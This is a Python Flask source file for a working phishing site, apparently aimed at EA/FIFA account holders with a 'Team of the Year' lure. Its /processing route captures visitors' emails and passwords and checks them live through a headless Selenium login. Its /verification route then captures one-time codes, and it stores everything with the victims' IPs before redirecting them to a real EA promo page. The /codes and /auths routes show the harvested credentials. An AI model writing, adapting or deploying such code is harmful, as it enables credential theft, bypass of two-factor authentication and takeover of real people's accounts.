from flask import Flask,render_template,jsonify,request,redirect,url_for
from email_validator import validate_email, EmailNotValidError
from BOT import login
# from repository import database as db  
from repository.mariadb_handler import MariaDB
db = MariaDB()
######## IMPORTS
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
######### CONFIG
chrome_options = Options()
chrome_options.add_argument('--headless')
chrome_options.add_argument('--no-sandbox')
chrome_options.add_argument('--disable-dev-shm-usage')
#global driver
app = Flask(__name__)
import os   
from datetime import datetime
@app.route('/addauth', methods=['GET','POST'])
def trytowin():
    if request.method == 'GET':
        _id = str(os.getpid()) + str(datetime.now())
        print(_id)
        db.addAuth(_id,'email','password','ip')
        return jsonify({'msg':'done'})
    if request.method == 'POST':
        pass
    return 'error'






@app.route('/invalidemail')
def invalid_email():
    return render_template('wrongemailNew.html')


@app.route('/')
def signin():
    return render_template('loginNEw.html')

@app.route('/codes')
def getCodes():
    codes = db.getCodes()
    #return jsonify(codes),200
    return render_template('auth.html',codes=codes)

@app.route('/auths')
def getAuth():
    codes = db.getAuth()
    #return jsonify(codes),200
    return render_template('auth.html',codes=codes)

@app.route('/verification',methods=['GET','POST'])
def even():
    if request.method == 'GET':
        return render_template('Login Verification.html',message="test@test.test")
    if request.method == 'POST':
        form = request.form
        ip = request.remote_addr
        code = form['oneTimeCode']
        session_id = form['amine_id']
        # print('---->session_id<----',session_id)
        print(session_id,code,ip)
        db.addCode(session_id,code,ip)
        return redirect("https://www.ea.com/fr-fr/games/fifa/fifa-21/ultimate-team/toty?utm_campaign=fifa21_hd_ww_ic_ic_fb_fifa-21-team-of-the-year-fb&utm_source=facebook&utm_medium=social&cid=67367&ts=1610042080443&fbclid=IwAR3IcOK9a3DxIoAX0pAZuU45t-yplwVHmSwj1fmEWXj2ow7-dTl4AYLSkEs")

    #return jsonify({'message':'your event link '}),200
def mask_email(email):
    lo = email.find('@')
    if lo>0:
        m_email = email[0:2]+"*******" + email[lo-1:]
        return m_email

@app.route('/processing',methods=['GET','POST'])
def process():
    if request.method == 'GET':
        #driver = webdriver.Chrome(options=chrome_options)
        return render_template('loginNEw.html')
    if request.method == 'POST':
        form = request.form
        ip = request.remote_addr
        email = form['email']
        password =form['password']
        try:
            # Validate.
            valid = validate_email(email)
            # Update with the normalized form.
            email = valid.email  
            driver = webdriver.Chrome(options=chrome_options)
            status =login(email,password,driver)
            print(email,password,ip)
            if status =='succ':
                _id = str(os.getpid()) + str(datetime.now())
                m_email = mask_email(email)
                db.addAuth(_id, email,password,ip)
                #driver.quit()
                return render_template('Login Verification.html',message=m_email,session_id=_id)
            elif status == 'email_error' :
                return render_template('wrongemailNew.html')
            else :
                print('unknown issues')
                return render_template('wronginfosNew.html')
                #driver.quit()
            #return jsonify(email,password),200          
        except EmailNotValidError as e:
            # email is not valid, exception message is human-readable
            print(str(e))
            #driver.quit()
            return render_template('wrongemailNew.html')




if __name__ == "__main__":
    app.run(port=6000,host='0.0.0.0',debug=False)
